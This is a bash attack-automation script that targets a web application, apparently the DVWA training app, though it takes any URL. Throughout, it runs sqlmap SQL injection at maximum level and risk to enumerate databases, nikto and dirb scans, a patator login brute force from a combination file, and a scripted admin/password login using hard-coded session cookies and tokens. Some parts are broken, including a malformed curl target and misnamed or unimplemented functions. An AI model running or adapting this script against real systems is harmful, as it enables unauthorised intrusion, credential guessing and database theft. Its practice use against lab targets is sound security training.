#!/bin/bash

# Far from perfect but should do for now. Also, the functionality is extensible

url=$1 # the location of the web-application

# this function is a terminal state
function usage_help {
    echo "SIMPLEST USAGE: ./attacker.sh <url>"
    echo "Usage: ./attacker.sh [-a CookieFile | -u user -p pass] <web-app URL>"
    echo "  -h: To display this usage message"
    echo "  -a: An optional argument to provide cookie file used for authenticated attacks"
    echo "  -u, -p: An optional argument to provide username and password for authentication"
    echo "  If -u, -p are used then -a should not be used and vice versa. -u, -p must be used"
    echo "  together"
    echo "A listing of available tests: "
    echo "      scan_by_nikto"
    echo "      scan_by_dirb"
    echo "      attack_by_burp"
    echo "      brute_by_potator"
    echo "      attack_by_zaproxy"
    echo "      attack_by_custom: "
    echo "          Not Implemented"
    exit 1
}

# this is the list of available attacks.
# every function should have as many different attack configurations.
function attack_by_sqlmap {
    sqlmap -u "$url/vulnerabilities/sqli/" --data="id=1&Submit=Submit" --cookie="PHPSESSID=6qbahqf2h6pgfjj3hak5k4vag0; security=medium" --random-agent --batch
    sqlmap --url=$url/vulnerabilities/sqli/ --data="id=1&Submit=Submit" --cookie="PHPSESSID=6qbahqf2h6pgfjj3hak5k4vag0; security=medium" --user-agent=SQLMAP --delay=1 --timeout=15 --retries=2 --keep-alive --threads=5 --eta --batch --dbms=MySQL --os=Windows --level=5 --risk=3 --banner --is-dba --dbs --tables --technique=BEUST -s $PWD/scan_report.txt --flush-session -t $PWD/scan_trace.txt --fresh-queries
}

function scan_by_nikto {
    nikto -h $url -ask no
    nikto -Cgidirs all -h $url -ask no
}

function scan_by_dirb {
    dirb $url
}

#function attack_by_burp { echo "" }

function brute_by_patator {
    patator http_fuzz url=$url/login.php method=POST body='username=COMBO00&password=COMBO01&Login=Login&user_token=ab277e16a3d331b31e95e637fb3a5ab3' 0=combos.txt before_urls=$url/login.php accept_cookie=1 follow=1 -x ignore:fgrep='Login Failed' -l $PWD/patator_out
}

#function attack_by_custom { echo "" }

# if you add a function above, add it to this array as well
att_scan=("attack_by_sqlmap" "scan_by_nikto" "scan_by_dirb" "attack_by_burp" "brute_by_patator" "attack_by_custom")


# this is the main function
function main {

    # TODO: choose an attack by random
    attack_by_sqlmap
    scan_by_nikto
    scan_by_dirb
    brute_by_patator

    curl -i -s -k  -X $'POST' \
    -H $'User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0' -H $'Referer: '$url'/login.php' -H $'Upgrade-Insecure-Requests: 1' -H $'Content-Type: application/x-www-form-urlencoded' \
    -b $'PHPSESSID=6qbahqf2h6pgfjj3hak5k4vag0; security=medium' \
    --data-binary $'username=admin&password=password&Login=Login&user_token=1025b97aa7efca18ac71ada3e75429f8' \
    $$url'/login.php'
}

if [ $# -eq 0 ];
then
    usage_help
else
    u_bit=0
    p_bit=0
    a_bit=0
    user=""
    pass=""
    auth_file=""
    while getopts ":a:hu:p:" opt "url"; do
        case $opt in
            a)
                auth_file="$OPTARG"
                a_bit=1
                ;;
            u)
                user="$OPTARG"
                u_bit=1
                ;;
            p)
                pass="$OPTARG"
                p_bit=1
                ;;
            \?)
                echo "Invalid option: -$OPTARG" >&2
                ;;
            :)
                echo "Option -$OPTARG requires an argument" >&2
                ;;
        esac
    done

    # verify the data
    if [[ $a_bit -eq 1 && $((u_bit+p_bit)) -ge 1 ]];
    then
        echo "[USAGE ERROR]: '-a' cannot be combined with '-u' and/or '-p'"
        exit
    elif [ $a_bit -eq 0 ] && [ $u_bit -ne $p_bit ];
    then
        echo "[USAGE ERROR]: '-u' and '-p' must be used together"
        exit
    fi

    # now call the main function based on the arguments
    main  $url
fi
